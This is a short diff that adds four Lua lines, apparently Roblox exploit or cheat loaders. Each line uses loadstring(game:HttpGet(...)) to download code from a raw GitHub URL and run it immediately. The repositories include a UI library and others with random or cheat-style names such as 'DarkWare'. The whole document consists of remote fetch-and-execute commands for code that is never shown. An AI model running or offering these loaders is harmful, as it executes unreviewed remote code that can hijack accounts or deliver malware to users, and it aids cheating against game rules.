@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yarik312/DarkWare/main/MainLoader"), true))();
